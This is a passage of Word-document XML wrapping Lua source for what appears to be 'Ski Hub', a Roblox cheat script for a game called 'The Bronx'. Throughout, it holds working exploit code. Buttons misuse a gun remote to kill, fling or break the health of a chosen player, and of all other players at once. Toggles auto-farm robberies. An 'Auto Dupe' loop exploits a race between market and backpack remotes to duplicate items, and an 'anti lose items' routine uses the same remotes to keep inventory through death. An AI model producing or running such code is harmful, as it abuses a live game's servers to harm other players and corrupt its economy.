        <w:t xml:space="preserve">            info = "FilthyStack: " .. filthyValue,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p/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"Money: " .. moneyValue,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">-- view bank                               </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:button({name = "Down Player - Hold Gun", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(kill_gun, Config.TheBronx.PlayerUtilities.SelectedPlayer, "HumanoidRootPart", (Players[Config.TheBronx.PlayerUtilities.SelectedPlayer].Character.Humanoid.Health - 5))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:button({name = "Kill Player - Hold Gun", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(kill_gun, Config.TheBronx.PlayerUtilities.SelectedPlayer, "HumanoidRootPart", math.huge)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:button({name = "God Player - Hold Gun", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(kill_gun, Config.TheBronx.PlayerUtilities.SelectedPlayer, "HumanoidRootPart", math.sqrt(-1))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:button({name = "Fling Player - Hold Gun", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index=1, 50 do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        pcall(kill_gun, Config.TheBronx.PlayerUtilities.SelectedPlayer, "LeftUpperLeg", 0.01) --RightUpperLeg</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:button({name = "God All Players - Hold Gun", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for Index, Value in Players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Value ~= LocalPlayer and Value.Character and Value.Character:FindFirstChild("Humanoid") and Value.Character:FindFirstChild("Humanoid").Health ~= 0 and not Value.Character:FindFirstChildOfClass("ForceField") and Value.Character:FindFirstChild("HumanoidRootPart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                pcall(kill_gun, Value.Name, "HumanoidRootPart", math.sqrt(-1))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(0.1)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end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:button({name = "Kill All Players - Hold Gun", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for Index, Value in Players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Value ~= LocalPlayer and Value.Character and Value.Character:FindFirstChild("Humanoid") and Value.Character:FindFirstChild("Humanoid").Health ~= 0 and not Value.Character:FindFirstChildOfClass("ForceField") and Value.Character:FindFirstChild("HumanoidRootPart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                pcall(kill_gun, Value.Name, "HumanoidRootPart", math.huge)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(0.1)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end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            do -- \\ Misc Tab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Column = MiscTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local FarmingSection = Column:section({name = "Farming", size = 0.520, default = false, side = 'left', icon = GetImage("Wheatt.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmingSection:toggle({type = "toggle", name = "Auto Farm Construction", flag = "FarmConstruction_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Farms.FarmConstructionJob = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --[[FarmingSection:toggle({type = "toggle", name = "Auto Farm Bank Robbery", flag = "FarmBank_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Farms.FarmBank = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmingSection:toggle({type = "toggle", name = "Auto Farm House Robbery", flag = "FarmHouses_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Farms.FarmHouses = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmingSection:toggle({type = "toggle", name = "Auto Farm Studio Robbery", flag = "FarmStudio_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Farms.FarmStudio = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmingSection:toggle({type = "toggle", name = "Auto Collect Dropped Cash", flag = "FarmDroppedMoney_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Farms.CollectDroppedMoney = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmingSection:toggle({type = "toggle", name = "Auto Collect Dropped Bags", flag = "FarmDroppedLoot_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Farms.CollectDroppedLoot = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmingSection:toggle({type = "toggle", name = "Auto Farm Trash", flag = "FarmDumpsters_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Farms.FarmTrash = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})               </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmingSection:toggle({type = "toggle", name = "Auto Sell Trash", flag = "SellTrash_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Farms.AutoSellTrash = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local megaphonesection = Column:section({name = "Megaphone List", side = "left", size = 0.470, icon = GetImage("Wrench.png")})   </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>megaphonesection:button({name = "Hands UP!", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ohString1 = "Hands UP!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        game:GetService("ReplicatedStorage").MegaphoneRemote:FireServer(ohString1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>megaphonesection:button({name = "Driver Pull Over!", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ohString1 = "Driver Pull Over!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        game:GetService("ReplicatedStorage").MegaphoneRemote:FireServer(ohString1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>megaphonesection:button({name = "Move it FOLKS!", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ohString1 = "Move it FOLKS!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        game:GetService("ReplicatedStorage").MegaphoneRemote:FireServer(ohString1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>megaphonesection:button({name = "PULL OVER NOW!", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ohString1 = "PULL OVER NOW!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        game:GetService("ReplicatedStorage").MegaphoneRemote:FireServer(ohString1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">})                                </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Column = MiscTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local DupingSection = Column:section({name = "Duping Section", size = 0.34, default = false, side = 'right', icon = GetImage("Node.png")}) </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--auto dupe start</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>DupingSection:toggle({name = "Auto Dupe", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        AutoDupe = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Player = game.Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local ReplicatedStorage = game.ReplicatedStorage</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local FirstTool = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            repeat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FirstTool = Player.Character and Player.Character:FindFirstChildOfClass("Tool")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            until FirstTool or not AutoDupe</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if AutoDupe and not FirstTool then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    info = "No tool found in hand! Please equip one.",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local ToolName = FirstTool.Name</w:t>
      </w:r>
    </w:p>
    <w:p/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"Auto Dupe started for: " .. ToolName,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            while AutoDupe do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Cooldown then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Cooldown = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local ToolId</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Connection = ReplicatedStorage.MarketItems.ChildAdded:Connect(function(item)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if item.Name == ToolName then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if item:WaitForChild("owner").Value == Player.Name then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ToolId = item:GetAttribute("SpecialId")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end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ReplicatedStorage.ListWeaponRemote:FireServer(ToolName, 999999)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(.25) --255</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ReplicatedStorage.BackpackRemote:InvokeServer("Store", ToolName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(2.9) --3.3</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ReplicatedStorage.BuyItemRemote:FireServer(ToolName, "Remove", ToolId)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ReplicatedStorage.BackpackRemote:InvokeServer("Grab", ToolName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Connection:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Cooldown = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(3) --3.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/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"Auto Dupe stopped.",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end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">})               </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>-- auto dupe end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- anti lose items</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Players = game:GetService("Players")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local ReplicatedStorage = game:GetService("ReplicatedStorage")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local LocalPlayer = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local ExemptItems = {"Phone", "Fist", "Shiesty", "Bandage", "Lemonade", "Car keys"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function MarketHasItem(toolName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local market = ReplicatedStorage:FindFirstChild("MarketItems")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not market then return false end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for _, item in ipairs(market:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if item.Name == toolName and item:FindFirstChild("owner") and item.owner.Value == LocalPlayer.Name then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function BackpackHasItem(toolName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if tool:IsA("Tool") and tool.Name == toolName then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function ForcePutToMarket(toolName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local endTime = os.clock() + 12 </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    while os.clock() &lt; endTime do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if MarketHasItem(toolName) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ReplicatedStorage.ListWeaponRemote:FireServer(toolName, 999999)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.15)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function ForceRetrieveFromMarket(toolName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local market = ReplicatedStorage:WaitForChild("MarketItems", 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not market then return false end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local endTime = os.clock() + 12</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    while os.clock() &lt; endTime do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for _, item in ipairs(market:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if item.Name == toolName</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                and item:FindFirstChild("owner")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                and item.owner.Value == LocalPlayer.Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                and item:GetAttribute("SpecialId") then</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local special = item:GetAttribute("SpecialId")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ReplicatedStorage.BuyItemRemote:FireServer(toolName, "Remove", special)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(0.2)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ReplicatedStorage.BackpackRemote:InvokeServer("Grab", toolName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(0.2)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if BackpackHasItem(toolName) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return true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task.wait(0.2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function SaveOnDeath(char)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hum = char:WaitForChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum.Died:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not Config.TheBronx.PlayerModifications.AntiLoseItems then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.25)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if tool:IsA("Tool") and not table.find(ExemptItems, tool.Name) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ForcePutToMarket(tool.Name)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end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function RetrieveAfterSpawn()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.delay(2.2, function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not Config.TheBronx.PlayerModifications.AntiLoseItems then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local market = ReplicatedStorage:FindFirstChild("MarketItems")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not market then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for _, item in ipairs(market:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if item:FindFirstChild("owner")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                and item.owner.Value == LocalPlayer.Name then</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
